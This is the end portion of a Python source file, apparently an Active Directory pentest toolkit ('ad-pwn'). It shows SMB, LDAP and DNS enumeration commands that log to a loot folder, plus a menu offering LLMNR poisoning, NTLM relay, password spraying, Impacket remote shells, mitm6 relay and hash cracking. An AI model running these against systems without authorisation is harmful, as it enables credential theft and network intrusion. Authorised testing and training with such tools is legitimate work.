        run_live(f"smbclient -L //{target_ip} -N", os.path.join(LOOT_DIR, "enum_smb_client.log"))
    elif c == "2":
        print(f"{Colors.BLUE}[*] Checking LDAP ports...{Colors.NC}")
        is_389 = check_port_open(target_ip, 389)
        is_636 = check_port_open(target_ip, 636)
        
        uri = f"ldap://{target_ip}"
        if not is_389 and is_636:
            print(f"{Colors.YELLOW}[!] Port 389 Closed. Switching to LDAPS (636).{Colors.NC}")
            uri = f"ldaps://{target_ip}"
        elif not is_389 and not is_636:
            print(f"{Colors.RED}[!] Warning: Ports 389 and 636 seem closed. Command may fail.{Colors.NC}")
        
        run_live(f"ldapsearch -x -H {uri} -b '' -s base namingContexts", os.path.join(LOOT_DIR, "enum_ldap.log"))

    elif c == "3":
        dom = get_input("Domain", "lab.local")
        run_live(f"nslookup -type=SRV _ldap._tcp.dc._msdcs.{dom} {target_ip}", os.path.join(LOOT_DIR, "enum_dns.log"))

def module_view_loot():
    os.system(f"ls -R {LOOT_DIR}")
    input("\nPress Enter...")

def print_centered(text, text_color=Colors.NC):
    clean = re.sub(r'\x1B\[[0-9;]*[a-zA-Z]', '', text)
    pad = FULL_WIDTH - 2 - len(clean)
    pad_l = pad // 2
    pad_r = pad - pad_l
    return f"{Colors.CYAN}║{Colors.NC}{' ' * pad_l}{text_color}{text}{Colors.NC}{' ' * pad_r}{Colors.CYAN}║{Colors.NC}"

def print_menu_row(idx, title, desc):
    t_str = f" {idx}. {title}"
    t_pad = t_str + " " * (24 - len(t_str[:24]))
    d_str = f" {desc}"
    d_pad = d_str + " " * (53 - len(d_str[:53]))
    return f"{Colors.CYAN}║{Colors.WHITE}{t_pad}{Colors.CYAN}║{Colors.WHITE}{d_pad}{Colors.CYAN}║{Colors.NC}"

def print_banner():
    os.system('clear')
    print(HDR_TOP)
    art = [
        " █████╗ ██████╗         ███████╗███╗   ██╗██╗   ██╗███╗   ███╗ ",
        "██╔══██╗██╔══██╗        ██╔════╝████╗  ██║██║   ██║████╗ ████║ ",
        "███████║██║  ██║        █████╗  ██╔██╗ ██║██║   ██║██╔████╔██║ ",
        "██╔══██║██║  ██║        ██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║ ",
        "██║  ██║██████╔╝        ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║ ",
        "╚═╝  ╚═╝╚═════╝         ╚═════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝ "
    ]
    for line in art:
        print(print_centered(line, Colors.RED))
    print(print_centered(""))
    print(print_centered("ACTIVE DIRECTORY ENUMERATION TOOLKIT", Colors.YELLOW))
    print(print_centered("By AkhilBangaru", Colors.BLUE))
    print(HDR_MID)
    print(print_menu_row("1", "Attack Advisor", "Smart Check: Signing, WinRM & Ports"))
    print(print_menu_row("2", "Responder", "Poison LLMNR/NBT-NS"))
    print(print_menu_row("3", "SMB Relay", "Relay NTLM to vulnerable hosts"))
    print(print_menu_row("4", "Password Spray", "NetExec Spraying (User/File Mode)"))
    print(print_menu_row("5", "Impacket Shell", "PsExec/WmiExec/SmbExec"))
    print(print_menu_row("6", "IPv6 Attack", "mitm6 + ntlmrelayx"))
    print(print_menu_row("7", "Enumeration", "SMB LDAP and DNS Recon"))
    print(print_menu_row("8", "Crack Hashes", "File or Paste Mode"))
    print(print_menu_row("9", "View Loot", "Browse captured data"))
    print(print_menu_row("0", "Exit", "Quit Application"))
    print(HDR_BOT)
    if CURRENT_IFACE:
        print(f"{Colors.YELLOW}Interface: {CURRENT_IFACE} | Loot: {LOOT_DIR}{Colors.NC}")

def main():
    check_root()
    check_tools()
    select_interface()
    while True:
        print_banner()
        choice = input(f"\n{Colors.BLUE}ad-pwn > {Colors.NC}")
        
        if choice == "1": module_attack_advisor()
        elif choice == "2": module_responder()
        elif choice == "3": module_smb_relay()
        elif choice == "4": module_password_spray()
        elif choice == "5": module_impacket_shell()
        elif choice == "6": module_ipv6()
        elif choice == "7": module_enumeration()
        elif choice == "8": module_crack_hashes()
        elif choice == "9": module_view_loot()
        elif choice == "0": sys.exit(0)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\nBye! Happy Hacking")
